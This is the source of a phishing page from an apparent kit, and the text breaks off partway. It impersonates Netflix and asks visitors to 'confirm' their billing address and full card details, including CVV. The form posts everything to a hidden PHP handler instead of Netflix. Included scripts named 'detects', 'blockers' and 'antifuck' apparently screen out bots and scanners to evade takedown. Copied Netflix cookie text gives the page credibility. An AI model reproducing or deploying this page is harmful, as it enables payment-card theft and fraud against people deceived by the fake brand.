<?php 
session_start();
include('../detects.php');
include('../blockers.php');
include('../antifuck.php');
?>
<?php

?>
<!DOCTYPE HTML>
<html lang="en" data-triggered="true">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
<link type="text/css" rel="stylesheet" href="assets/none3.css" data-uia="botLink">
<link rel="shortcut icon" href="assets/nficon2016.ico">
<link rel="apple-touch-icon" href="assets/icons/nficon2016.png">
<link rel="stylesheet" href="assets/style.css" />
</head>

<body data-new-gr-c-s-check-loaded="14.1018.0" data-gr-ext-installed=""><div id="appMountPoint"><div class="netflix-sans-font-loaded"><div class="basicLayout notMobile modernInApp fab5-bigger-cta fab5-bolder-cta fab5-bigger-typography fab5-cta-next signupSimplicity-registration simplicity" lang="en-BD" dir="ltr"><div class="nfHeader noBorderHeader signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="simpleContainer" data-transitioned-child="true"><div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">

<form method="POST" action="files/LvwTM2BE6USGkJsQ.php" autocomplete="off">
<div class="regFormContainer" data-uia="form-registration"><div class="stepHeader-container" data-uia="header"><div class="stepHeader" data-a11y-focus="true" tabindex="0" style="display:block;text-align: center;"><span id="" class="stepIndicator" style="text-align: center;padding-bottom: 12px;">STEP <b>2</b> OF <b>4</b></span>

<h1 class="stepTitle" data-uia="stepTitle" style="font-size: 21px;text-align: center;" >Confirm Your Billing Address</h1>
</div></div><div>

<ul class="simpleForm structural ui-grid">
<!--********-->
<li class="nfFormSpace"><div class="nfInput validated nfInputOversize"><div class="nfInputPlacement"><label class="input_id" ><input  name="Address" class="nfTextField hasText" type="text" tabindex="0" autocomplete="off" required maxlength="100" dir="ltr" value=""><label for="id_email" class="placeLabel">Billing Address</label></label></div></div></li>
<!--********-->
<!--********-->
<li class="nfFormSpace"><div class="nfInput validated nfInputOversize"><div class="nfInputPlacement"><label class="input_id" ><input  name="City" class="nfTextField hasText" type="text" tabindex="0" autocomplete="off" required maxlength="100" dir="ltr" value=""><label for="id_email" class="placeLabel">City</label></label></div></div></li>
<!--********-->
<!--********-->
<li class="nfFormSpace"><div class="nfInput validated nfInputOversize"><div class="nfInputPlacement"><label class="input_id" ><input  name="State" class="nfTextField hasText" type="text" tabindex="0" autocomplete="off" required maxlength="100" dir="ltr" value=""><label for="id_email" class="placeLabel">State</label></label></div></div></li>
<!--********-->
<!--********-->
<li class="nfFormSpace"><div class="nfInput validated nfInputOversize"><div class="nfInputPlacement"><label class="input_id" ><input  name="Postal" class="nfTextField hasText" type="text" tabindex="0" autocomplete="off"  required maxlength="8" dir="ltr" value=""><label for="id_email" class="placeLabel">Postal/Zip</label></label></div></div></li>
<!--********-->
<!--********-->
<li class="nfFormSpace">
	<div class="nfInput validated nfInputOversize">
		<div class="nfInputPlacement">
			<label class="input_id" >
<div class="form-group username" style="display: block;width: 100%;">
<select id="country" name="Country" style="height: 50px;width: 100%;padding: 0px 12px;border-color: #8c8c8c;font-size: 15px;color: #625c5c;" required >
   <option value="#" disabled selected >Select Country</option>
   <option value="United State Of America">United State Of America</option>
   <option value="United Kingdom">United Kingdom</option>
   <option value="#" disabled >------</option>
   <option value="Albania">Albania</option>
   <option value="Algeria">Algeria</option>
   <option value="American Samoa">American Samoa</option>
   <option value="Andorra">Andorra</option>
   <option value="Angola">Angola</option>
   <option value="Anguilla">Anguilla</option>
   <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
   <option value="Argentina">Argentina</option>
   <option value="Armenia">Armenia</option>
   <option value="Aruba">Aruba</option>
   <option value="Australia">Australia</option>
   <option value="Austria">Austria</option>
   <option value="Azerbaijan">Azerbaijan</option>
   <option value="Bahamas">Bahamas</option>
   <option value="Bahrain">Bahrain</option>
   <option value="Bangladesh">Bangladesh</option>
   <option value="Barbados">Barbados</option>
   <option value="Belarus">Belarus</option>
   <option value="Belgium">Belgium</option>
   <option value="Belize">Belize</option>
   <option value="Benin">Benin</option>
   <option value="Bermuda">Bermuda</option>
   <option value="Bhutan">Bhutan</option>
   <option value="Bolivia">Bolivia</option>
   <option value="Bonaire">Bonaire</option>
   <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
   <option value="Botswana">Botswana</option>
   <option value="Brazil">Brazil</option>
   <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
   <option value="Brunei">Brunei</option>
   <option value="Bulgaria">Bulgaria</option>
   <option value="Burkina Faso">Burkina Faso</option>
   <option value="Burundi">Burundi</option>
   <option value="Cambodia">Cambodia</option>
   <option value="Cameroon">Cameroon</option>
   <option value="Canada">Canada</option>
   <option value="Canary Islands">Canary Islands</option>
   <option value="Cape Verde">Cape Verde</option>
   <option value="Cayman Islands">Cayman Islands</option>
   <option value="Central African Republic">Central African Republic</option>
   <option value="Chad">Chad</option>
   <option value="Channel Islands">Channel Islands</option>
   <option value="Chile">Chile</option>
   <option value="China">China</option>
   <option value="Christmas Island">Christmas Island</option>
   <option value="Cocos Island">Cocos Island</option>
   <option value="Colombia">Colombia</option>
   <option value="Comoros">Comoros</option>
   <option value="Congo">Congo</option>
   <option value="Cook Islands">Cook Islands</option>
   <option value="Costa Rica">Costa Rica</option>
   <option value="Cote DIvoire">Cote DIvoire</option>
   <option value="Croatia">Croatia</option>
   <option value="Cuba">Cuba</option>
   <option value="Curaco">Curacao</option>
   <option value="Cyprus">Cyprus</option>
   <option value="Czech Republic">Czech Republic</option>
   <option value="Denmark">Denmark</option>
   <option value="Djibouti">Djibouti</option>
   <option value="Dominica">Dominica</option>
   <option value="Dominican Republic">Dominican Republic</option>
   <option value="East Timor">East Timor</option>
   <option value="Ecuador">Ecuador</option>
   <option value="Egypt">Egypt</option>
   <option value="El Salvador">El Salvador</option>
   <option value="Equatorial Guinea">Equatorial Guinea</option>
   <option value="Eritrea">Eritrea</option>
   <option value="Estonia">Estonia</option>
   <option value="Ethiopia">Ethiopia</option>
   <option value="Falkland Islands">Falkland Islands</option>
   <option value="Faroe Islands">Faroe Islands</option>
   <option value="Fiji">Fiji</option>
   <option value="Finland">Finland</option>
   <option value="France">France</option>
   <option value="French Guiana">French Guiana</option>
   <option value="French Polynesia">French Polynesia</option>
   <option value="French Southern Ter">French Southern Ter</option>
   <option value="Gabon">Gabon</option>
   <option value="Gambia">Gambia</option>
   <option value="Georgia">Georgia</option>
   <option value="Germany">Germany</option>
   <option value="Ghana">Ghana</option>
   <option value="Gibraltar">Gibraltar</option>
   <option value="Great Britain">Great Britain</option>
   <option value="Greece">Greece</option>
   <option value="Greenland">Greenland</option>
   <option value="Grenada">Grenada</option>
   <option value="Guadeloupe">Guadeloupe</option>
   <option value="Guam">Guam</option>
   <option value="Guatemala">Guatemala</option>
   <option value="Guinea">Guinea</option>
   <option value="Guyana">Guyana</option>
   <option value="Haiti">Haiti</option>
   <option value="Hawaii">Hawaii</option>
   <option value="Honduras">Honduras</option>
   <option value="Hong Kong">Hong Kong</option>
   <option value="Hungary">Hungary</option>
   <option value="Iceland">Iceland</option>
   <option value="Indonesia">Indonesia</option>
   <option value="India">India</option>
   <option value="Iran">Iran</option>
   <option value="Iraq">Iraq</option>
   <option value="Ireland">Ireland</option>
   <option value="Isle of Man">Isle of Man</option>
   <option value="Israel">Israel</option>
   <option value="Italy">Italy</option>
   <option value="Jamaica">Jamaica</option>
   <option value="Japan">Japan</option>
   <option value="Jordan">Jordan</option>
   <option value="Kazakhstan">Kazakhstan</option>
   <option value="Kenya">Kenya</option>
   <option value="Kiribati">Kiribati</option>
   <option value="Korea North">Korea North</option>
   <option value="Korea Sout">Korea South</option>
   <option value="Kuwait">Kuwait</option>
   <option value="Kyrgyzstan">Kyrgyzstan</option>
   <option value="Laos">Laos</option>
   <option value="Latvia">Latvia</option>
   <option value="Lebanon">Lebanon</option>
   <option value="Lesotho">Lesotho</option>
   <option value="Liberia">Liberia</option>
   <option value="Libya">Libya</option>
   <option value="Liechtenstein">Liechtenstein</option>
   <option value="Lithuania">Lithuania</option>
   <option value="Luxembourg">Luxembourg</option>
   <option value="Macau">Macau</option>
   <option value="Macedonia">Macedonia</option>
   <option value="Madagascar">Madagascar</option>
   <option value="Malaysia">Malaysia</option>
   <option value="Malawi">Malawi</option>
   <option value="Maldives">Maldives</option>
   <option value="Mali">Mali</option>
   <option value="Malta">Malta</option>
   <option value="Marshall Islands">Marshall Islands</option>
   <option value="Martinique">Martinique</option>
   <option value="Mauritania">Mauritania</option>
   <option value="Mauritius">Mauritius</option>
   <option value="Mayotte">Mayotte</option>
   <option value="Mexico">Mexico</option>
   <option value="Midway Islands">Midway Islands</option>
   <option value="Moldova">Moldova</option>
   <option value="Monaco">Monaco</option>
   <option value="Mongolia">Mongolia</option>
   <option value="Montserrat">Montserrat</option>
   <option value="Morocco">Morocco</option>
   <option value="Mozambique">Mozambique</option>
   <option value="Myanmar">Myanmar</option>
   <option value="Nambia">Nambia</option>
   <option value="Nauru">Nauru</option>
   <option value="Nepal">Nepal</option>
   <option value="Netherland Antilles">Netherland Antilles</option>
   <option value="Netherlands">Netherlands (Holland, Europe)</option>
   <option value="Nevis">Nevis</option>
   <option value="New Caledonia">New Caledonia</option>
   <option value="New Zealand">New Zealand</option>
   <option value="Nicaragua">Nicaragua</option>
   <option value="Niger">Niger</option>
   <option value="Nigeria">Nigeria</option>
   <option value="Niue">Niue</option>
   <option value="Norfolk Island">Norfolk Island</option>
   <option value="Norway">Norway</option>
   <option value="Oman">Oman</option>
   <option value="Pakistan">Pakistan</option>
   <option value="Palau Island">Palau Island</option>
   <option value="Palestine">Palestine</option>
   <option value="Panama">Panama</option>
   <option value="Papua New Guinea">Papua New Guinea</option>
   <option value="Paraguay">Paraguay</option>
   <option value="Peru">Peru</option>
   <option value="Phillipines">Philippines</option>
   <option value="Pitcairn Island">Pitcairn Island</option>
   <option value="Poland">Poland</option>
   <option value="Portugal">Portugal</option>
   <option value="Puerto Rico">Puerto Rico</option>
   <option value="Qatar">Qatar</option>
   <option value="Republic of Montenegro">Republic of Montenegro</option>
   <option value="Republic of Serbia">Republic of Serbia</option>
   <option value="Reunion">Reunion</option>
   <option value="Romania">Romania</option>
   <option value="Russia">Russia</option>
   <option value="Rwanda">Rwanda</option>
   <option value="St Barthelemy">St Barthelemy</option>
   <option value="St Eustatius">St Eustatius</option>
   <option value="St Helena">St Helena</option>
   <option value="St Kitts-Nevis">St Kitts-Nevis</option>
   <option value="St Lucia">St Lucia</option>
   <option value="St Maarten">St Maarten</option>
   <option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
   <option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
   <option value="Saipan">Saipan</option>
   <option value="Samoa">Samoa</option>
   <option value="Samoa American">Samoa American</option>
   <option value="San Marino">San Marino</option>
   <option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
   <option value="Saudi Arabia">Saudi Arabia</option>
   <option value="Senegal">Senegal</option>
   <option value="Seychelles">Seychelles</option>
   <option value="Sierra Leone">Sierra Leone</option>
   <option value="Singapore">Singapore</option>
   <option value="Slovakia">Slovakia</option>
   <option value="Slovenia">Slovenia</option>
   <option value="Solomon Islands">Solomon Islands</option>
   <option value="Somalia">Somalia</option>
   <option value="South Africa">South Africa</option>
   <option value="Spain">Spain</option>
   <option value="Sri Lanka">Sri Lanka</option>
   <option value="Sudan">Sudan</option>
   <option value="Suriname">Suriname</option>
   <option value="Swaziland">Swaziland</option>
   <option value="Sweden">Sweden</option>
   <option value="Switzerland">Switzerland</option>
   <option value="Syria">Syria</option>
   <option value="Tahiti">Tahiti</option>
   <option value="Taiwan">Taiwan</option>
   <option value="Tajikistan">Tajikistan</option>
   <option value="Tanzania">Tanzania</option>
   <option value="Thailand">Thailand</option>
   <option value="Togo">Togo</option>
   <option value="Tokelau">Tokelau</option>
   <option value="Tonga">Tonga</option>
   <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
   <option value="Tunisia">Tunisia</option>
   <option value="Turkey">Turkey</option>
   <option value="Turkmenistan">Turkmenistan</option>
   <option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
   <option value="Tuvalu">Tuvalu</option>
   <option value="Uganda">Uganda</option>
   <option value="United Kingdom">United Kingdom</option>
   <option value="Ukraine">Ukraine</option>
   <option value="United Arab Erimates">United Arab Emirates</option>
   <option value="United States of America">United States of America</option>
   <option value="Uraguay">Uruguay</option>
   <option value="Uzbekistan">Uzbekistan</option>
   <option value="Vanuatu">Vanuatu</option>
   <option value="Vatican City State">Vatican City State</option>
   <option value="Venezuela">Venezuela</option>
   <option value="Vietnam">Vietnam</option>
   <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
   <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
   <option value="Wake Island">Wake Island</option>
   <option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
   <option value="Yemen">Yemen</option>
   <option value="Zaire">Zaire</option>
   <option value="Zambia">Zambia</option>
   <option value="Zimbabwe">Zimbabwe</option>
</select>
</div>
			</label>
		</div>
	</div>
</li>
<!--********-->

<br />
<h3 style="text-align: center;font-size: 21px;">Confirm Your Card Details</h3>
<br />

<!--*****New***-->
<li class="nfFormSpace">
	<div class="nfInput validated nfInputOversize">
		<div class="nfInputPlacement">
			<label class="input_id" >
			<input name="Number" class="nfTextField hasText" type="text" id="cc" tabindex="0" placeholder="xxxx-xxxx-xxxx-xxxx" autocomplete="off" required maxlength="19" dir="ltr" value=""/>
			<label for="id_email" class="placeLabel">Card Number</label>
			</label>
		</div>
	</div>
</li>
			<script>
				function cc_format(value) {
				  var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
				  var matches = v.match(/\d{4,16}/g);
				  var match = matches && matches[0] || ''
				  var parts = []
				  for (i=0, len=match.length; i<len; i+=4) {
					parts.push(match.substring(i, i+4))
				  }
				  if (parts.length) {
					return parts.join(' ')
				  } else {
					return value
				  }
				}

				onload = function() {
				  document.getElementById('cc').oninput = function() {
					this.value = cc_format(this.value)
				  }
				}
			</script>
<!--********-->
<li class="nfFormSpace">
	<div class="nfInput validated nfInputOversize">
		<div class="nfInputPlacement">
			<label class="input_id" >
			<input name="Name" class="nfTextField hasText" type="text" tabindex="0" placeholder="John Doe" autocomplete="off" required maxlength="100" dir="ltr" value=""/>
			<label for="id_email" class="placeLabel">Name On Card</label>
			</label>
		</div>
	</div>
</li>
<!--********-->
<li class="nfFormSpace">
	<div class="nfInput validated nfInputOversize">
		<div class="nfInputPlacement">
			<label class="input_id" >
		<div class="WFInput__inputContainer___13Pit" style="margin-top: 25px;margin-bottom: 13px;">

								<label for="user" style="float:left;padding: 8px 10px 0px 0px;margin-left: 10px;color: #6c6666;font-weight: normal;font-size: 15px;">Expiry Date:</label>
									<select name="Month" style="height: 40px;width: 29%;padding: 0px 12px;opacity: 0.9;border-radius: 6px;border-color: #d2d2d7;margin-right: 11px;font-size:15px;" required >
										<option value="#" disabled selected >Month</option>
										<option value="01">01</option>
										<option value="02">02</option>
										<option value="03">03</option>
										<option value="04">04</option>
										<option value="05">05</option>
										<option value="06">06</option>
										<option value="07">07</option>
										<option value="08">08</option>
										<option value="09">09</option>
										<option value="10">10</option>
										<option value="11">11</option>
										<option value="12">12</option>
									</select>
									<select name="Year" style="height: 40px;width: 30%;padding: 0px 12px;opacity: 0.9;border-radius: 6px;border-color: #d2d2d7;font-size:15px;" required >
										<option value="#" disabled selected >Year</option>
										<option value="2021">2021</option>
										<option value="2022">2022</option>
										<option value="2023">2023</option>
										<option value="2024">2024</option>
										<option value="2025">2025</option>
										<option value="2026">2026</option>
										<option value="2027">2027</option>
										<option value="2028">2028</option>
										<option value="2029">2029</option>
										<option value="2030">2030</option>
										<option value="2031">2031</option>
										<option value="2032">2032</option>
										<option value="2033">2033</option>
										<option value="2034">2034</option>
										<option value="2035">2035</option>
									</select>

		</div>
			</label>
		</div>
	</div>
</li>
<!--********-->
<li class="nfFormSpace">
	<div class="nfInput validated nfInputOversize">
		<div class="nfInputPlacement">
			<label class="input_id" >
			<input name="CVV" class="nfTextField hasText" type="text" placeholder="123" tabindex="0" autocomplete="off" required maxlength="4" dir="ltr" value=""/>
			<label for="id_email" class="placeLabel">CVV/CVC</label>
			</label>
		</div>
	</div>
</li>
<!--********-->











</ul></div></div>
<div class="submitBtnContainer">
<button type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_next_tc">Next</button>
</div>
</form>


</div></div><div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="#">Questions? Contact us.</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Center</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li></ul></div></div><div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div></div></div></div><div>

<script src="assets/none.js"></script>

</div><div id="onetrust-consent-sdk"><div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div><div id="onetrust-pc-sdk" class="ot-sdk-container otPcTab ot-hide ot-fade-in" role="dialog" aria-modal="true" aria-labelledby="pc-title" lang="en"><!-- pc header --><div class="pc-header"><!-- Header logo --><div class="pc-logo-container"><div class="pc-logo" role="img" aria-label="Company Logo" style="background-image: url(&quot;assets/Netflix_Logo_PMS.png&quot;)"></div></div><div class="pc-title-container"><h2 id="pc-title">Privacy Preference Center</h2><div class="pc-close-btn-container"><button id="close-pc-btn-handler" class="pc-close-button ot-close-icon" aria-label="Close"></button></div></div></div><!-- content --><div id="ot-content"><!-- Groups / Sub groups with cookies --><div class="ot-main-content pc-content"><div class="ot-sdk-container groups-container"><div class="ot-sdk-row" role="tablist" aria-label="Cookie Categories"><!-- About Privacy container --><div class="ot-sdk-column"><div class="ot-sdk-four ot-sdk-columns group active-group category-menu-switch-handler" role="tab" tabindex="0" aria-selected="true" aria-controls="pc-tab-description"><h3 id="privacy-text">General Description</h3></div></div><div class="ot-sdk-eight ot-sdk-columns description-container" id="pc-tab-description" tabindex="0" role="tabpanel" aria-labelledby="pc-privacy-header"><h3 id="pc-privacy-header">General Description</h3><p id="pc-policy-text" class="group-description"><br>This cookie tool will help you understand who is using cookies to collect information from your device, for what purposes they use the information, and how you can control the use of cookies for non-essential activities.<br>
<br>
Netflix supports the Self-Regulatory Principles for Online Behavioral Advertising of the Digital Advertising Alliance (DAA), the Digital Advertising Alliance of Canada (DAAC), and the European Interactive Digital Advertising Alliance (EDAA).<br>
<br>
If you opt out of advertising cookies, you may still see Netflix ads on other sites, but those ads will not be customized by us or our service providers and we will continue to customize your experience on our website via our use of cookies you have not refused.<br>
<br>
Alternatively, privacy settings in most browsers will allow you to prevent your browser from accepting new cookies, have it notify you when you receive a new cookie, or disable cookies altogether. If your browser is set to not accept any cookies, you will not receive Interest-Based Advertising, but your use of the Netflix service may be impaired or unavailable. In addition, if you use our cookie tool to opt-out of certain cookies, your opt-out preferences will be remembered by placing a cookie on your device. It is therefore important that your browser is configured to accept cookies for your preferences to take effect. If you delete or clear your cookies, or if you change which web browser you are using, you will need to set your cookie preferences again.
<br>
<br>
Note that from time to time we are over-inclusive in which cookies are listed in the opt-out tool. For example, we do not use Facebook, Twitter or Google cookies in all regions.<br>
<br>
For more information on our use of cookies, please visit the <a href="#">Cookies and Internet Advertising</a> section of our

<a href="#">Privacy Statement.</a><br>

<br></p></div><ul class="category-group"><li class="category-item ot-always-active-group" data-optanongroupid="C0001"><div class="ot-sdk-column"><div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0001"><h3 id="ot-header-id-C0001">Essential Cookies</h3></div></div><div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001"><div class="group-toggle"><h3 class="category-header">Essential Cookies</h3><div class="ot-toggle-group"><div class="ot-always-active">Always Active</div><div class="ot-toggle ot-hide-tgl"><div class="checkbox"><!-- DYNAMICALLY GENERATE Input ID  --> <input id="ot-group-id-C0001" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0001" aria-labelledby="ot-header-id-C0001" aria-hidden="true" name="ot-group-id-C0001" data-optanongroupid="C0001" checked=""> <label for="ot-group-id-C0001"><span class="label-text">Essential Cookies</span></label><!-- DYNAMICALLY GENERATE Input ID  --></div></div></div></div><p class="group-description ot-category-desc">These cookies are strictly necessary to provide our website or online service. For example, we and our Service Providers may use these cookies to authenticate and identify visitors when they use our websites and applications so we can provide our service to them. They also help us to enforce our Terms of Use, prevent fraud and maintain the security of our services.<br>
<br>
Lifespan: Most cookies are session cookies (which are only active until you close your browser) or are cookies which are only active for one day. Some cookies are active for a longer time, ranging from 3 to 12 months. The cookies used to prevent fraud and maintain the security or our services are active for a maximum period of 24 months. </p><!-- sub groups --><div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0001">Cookies Details&lrm;</a></div></div></li><li class="category-item ot-always-active-group" data-optanongroupid="C0002"><div class="ot-sdk-column"><div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0002"><h3 id="ot-header-id-C0002">Performance and Functionality Cookies</h3></div></div><div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0002"><div class="group-toggle"><h3 class="category-header">Performance and Functionality Cookies</h3><div class="ot-toggle-group"><div class="ot-always-active">Always Active</div><div class="ot-toggle ot-hide-tgl"><div class="checkbox"><!-- DYNAMICALLY GENERATE Input ID  --> <input id="ot-group-id-C0002" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0002" aria-labelledby="ot-header-id-C0002" aria-hidden="true" name="ot-group-id-C0002" data-optanongroupid="C0002" checked=""> <label for="ot-group-id-C0002"><span class="label-text">Performance and Functionality Cookies</span></label><!-- DYNAMICALLY GENERATE Input ID  --></div></div></div></div><p class="group-description ot-category-desc">These cookies help us to customize and enhance your online experience with Netflix. For example, they help us to remember your preferences and prevent you from needing to re-enter information you previously provided (for example, during member sign up). We also use these cookies to collect information (such as popular pages, conversion rates, viewing patterns, click-through and other information) about our visitors' use of the Netflix service so that we can enhance and customize our website and service and conduct market research. Deletion of these types of cookies may result in limited functionality of our service.<br>
<br>
Lifespan: Most cookies are only active for one day. Some cookies are active for a longer time, ranging from 3 to 12 months. </p><!-- sub groups --><div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0002">Cookies Details&lrm;</a></div></div></li><li class="category-item" data-optanongroupid="C0004"><div class="ot-sdk-column"><div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0004"><h3 id="ot-header-id-C0004">Advertising Cookies</h3></div></div><div class="ot-sdk-eight ot-sdk-columns description-container ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0004"><div class="group-toggle"><h3 class="category-header">Advertising Cookies</h3><div class="ot-toggle-group"><div class="ot-toggle"><div class="checkbox"><!-- DYNAMICALLY GENERATE Input ID  --> <input id="ot-group-id-C0004" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0004" aria-labelledby="ot-header-id-C0004" name="ot-group-id-C0004" data-optanongroupid="C0004" checked=""> <label for="ot-group-id-C0004"><span class="label-text">Advertising Cookies</span></label><!-- DYNAMICALLY GENERATE Input ID  --></div></div></div></div><p class="group-description ot-category-desc">These cookies use information about your use of this and other websites and apps, your response to ads and emails, and to deliver ads that are more relevant to you and for analytics and optimization purposes. These types of ads are called "interest-based advertising" and will be shown to you outside the Netflix domain. Netflix uses contractual and technical measures designed to prevent advertising partners from accessing information regarding specific title selections you make, URLs you land on, or shows you have watched on our service. We do not share information about title selections or your shows you have watched on our service. The advertising cookies associated with our service belong to our advertising partners as listed under cookie details. Please choose your settings for advertising cookies below. If you want to opt out of the advertising cookies across all websites, go <a href="#">here.</a><br>
<br>
Note that from time to time we are over-inclusive in which cookies are listed in the opt-out tool. For example, we do not use Facebook, Twitter or Google cookies in all regions. </p><!-- sub groups --><div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0004">Cookies Details&lrm;</a></div></div></li></ul></div></div></div><!-- Vendors / Hosts --><section id="vendors-list" class="ot-hide"><div class="vendor-content"><nav id="vendors-list-header"><div class="navigation-container"><a class="back-btn-handler" role="button" href="javascript:void(0)"><div id="ot-back-arrow"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="15px" height="15px" viewBox="0 0 444.531 444.531" xml:space="preserve"><title>Back Button</title><g><path fill="#2c3643" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
